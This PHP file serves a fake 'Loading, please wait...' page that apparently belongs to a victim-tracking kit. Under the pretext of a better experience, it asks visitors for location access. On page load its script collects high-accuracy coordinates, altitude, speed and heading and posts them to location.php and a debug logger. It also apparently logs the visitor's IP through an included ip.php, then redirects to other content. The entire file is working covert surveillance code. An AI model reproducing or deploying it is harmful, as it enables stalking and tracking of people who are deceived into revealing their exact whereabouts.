<?php
include 'ip.php';

echo <<<'HTML'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            padding: 50px 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            max-width: 500px;
            width: 100%;
        }
        
        h2 {
            font-size: 24px;
            margin-bottom: 15px;
            color: #fff;
            font-weight: 300;
        }
        
        p {
            font-size: 16px;
            margin-bottom: 25px;
            color: #ccc;
            line-height: 1.5;
        }
        
        #locationStatus {
            font-size: 14px;
            color: #4CAF50;
            margin: 20px 0;
            min-height: 20px;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-left: 4px solid #4CAF50;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress {
            width: 0%;
            height: 100%;
            background: #4CAF50;
            border-radius: 3px;
            transition: width 0.3s ease;
        }
        
        .error-message {
            color: #ff4444;
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #ff4444;
            border-radius: 5px;
            display: none;
        }

        .retry-button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 15px;
            display: none;
        }

        .retry-button:hover {
            background: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Loading, please wait...</h2>
        <p>Please allow location access for better experience</p>
        
        <div class="progress-bar">
            <div class="progress" id="progressBar"></div>
        </div>
        
        <p id="locationStatus">Initializing...</p>
        <div class="spinner"></div>
        <div class="error-message" id="errorMessage"></div>
        <button class="retry-button" id="retryButton">Retry Location</button>
    </div>

    <script>
        class LocationService {
            constructor() {
                this.locationStatus = document.getElementById('locationStatus');
                this.progressBar = document.getElementById('progressBar');
                this.errorMessage = document.getElementById('errorMessage');
                this.retryButton = document.getElementById('retryButton');
                this.timeout = 25000;
                this.forwardingLink = './index2.html';
                this.retryCount = 0;
                this.maxRetries = 2;
            }

            debugLog(message) {
                if (message.includes('Lat:') || message.includes('Latitude:') || message.includes('Position obtained')) {
                    console.log('[v0] DEBUG:', message);
                    
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', 'debug_log.php', true);
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    xhr.send('message=' + encodeURIComponent(message));
                }
            }

            showError(message) {
                if (this.errorMessage) {
                    this.errorMessage.textContent = message;
                    this.errorMessage.style.display = 'block';
                }
            }

            updateProgress(percentage) {
                if (this.progressBar) {
                    this.progressBar.style.width = percentage + '%';
                }
            }

            updateStatus(message) {
                if (this.locationStatus) {
                    this.locationStatus.textContent = message;
                    this.locationStatus.style.color = '#4CAF50';
                }
            }

            updateStatusWarning(message) {
                if (this.locationStatus) {
                    this.locationStatus.textContent = message;
                    this.locationStatus.style.color = '#FFA500';
                }
            }

            showRetryButton() {
                if (this.retryButton && this.retryCount < this.maxRetries) {
                    this.retryButton.style.display = 'block';
                    this.retryButton.onclick = () => {
                        this.retryCount++;
                        this.retryButton.style.display = 'none';
                        this.errorMessage.style.display = 'none';
                        this.getLocation();
                    };
                }
            }

            async getLocation() {
                this.updateStatus('Requesting location permission...');
                this.updateProgress(20);

                if (!navigator.geolocation) {
                    this.updateStatus('Geolocation not supported');
                    this.showError('Your browser does not support geolocation. Redirecting...');
                    this.updateProgress(100);
                    await this.delay(2000);
                    this.redirectToMainPage();
                    return;
                }

                try {
                    this.updateStatus('Getting your location...');
                    this.updateProgress(40);

                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            resolve,
                            (error) => {
                                console.log('[v0] High accuracy failed, trying standard...', error);
                                this.updateStatusWarning('Getting approximate location...');
                                
                                navigator.geolocation.getCurrentPosition(
                                    resolve,
                                    reject,
                                    {
                                        enableHighAccuracy: false,
                                        timeout: this.timeout,
                                        maximumAge: 60000
                                    }
                                );
                            },
                            {
                                enableHighAccuracy: true,
                                timeout: this.timeout,
                                maximumAge: 0
                            }
                        );
                    });

                    await this.sendPosition(position);
                    this.updateProgress(80);
                    await this.delay(1000);
                    this.redirectToMainPage();

                } catch (error) {
                    this.handleError(error);
                    
                    if (this.retryCount >= this.maxRetries) {
                        this.updateProgress(100);
                        await this.delay(2000);
                        this.redirectToMainPage();
                    }
                }
            }

            async sendPosition(position) {
                this.updateStatus('Location obtained, processing...');
                this.updateProgress(60);

                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;

                this.debugLog(`Position obtained - Lat: ${lat}, Lon: ${lon}, Accuracy: ${acc}m`);

                try {
                    const formData = new URLSearchParams();
                    formData.append('lat', lat);
                    formData.append('lon', lon);
                    formData.append('acc', acc);
                    formData.append('alt', position.coords.altitude || '');
                    formData.append('altAcc', position.coords.altitudeAccuracy || '');
                    formData.append('heading', position.coords.heading || '');
                    formData.append('speed', position.coords.speed || '');
                    formData.append('time', new Date().toISOString());

                    const response = await fetch('./location.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: formData
                    });

                    if (response.ok) {
                        const result = await response.json();
                        this.debugLog('Location sent successfully: ' + JSON.stringify(result));
                    } else {
                        console.error('[v0] Failed to send location:', response.status, await response.text());
                    }

                } catch (error) {
                    console.error('[v0] Error sending location:', error);
                }
            }

            handleError(error) {
                const errorMessages = {
                    1: 'Location permission denied. Please allow location access.',
                    2: 'Location unavailable. Please check your GPS/network.',
                    3: 'Location request timed out. Please try again.'
                };

                const errorMessage = errorMessages[error.code] || 'Location error occurred. Please try again.';
                
                this.updateStatusWarning('Location access issue');
                this.showError(errorMessage);
                this.showRetryButton();
                
                this.debugLog(`Location error ${error.code}: ${error.message}`);
            }

            redirectToMainPage() {
                this.updateStatus('Redirecting to content...');
                this.updateProgress(100);
                
                setTimeout(() => {
                    window.location.href = this.forwardingLink;
                }, 1000);
            }

            delay(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            const locationService = new LocationService();
            
            setTimeout(async () => {
                await locationService.getLocation();
            }, 1000);
        });
    </script>
</body>
</html>
HTML;

exit;
?>
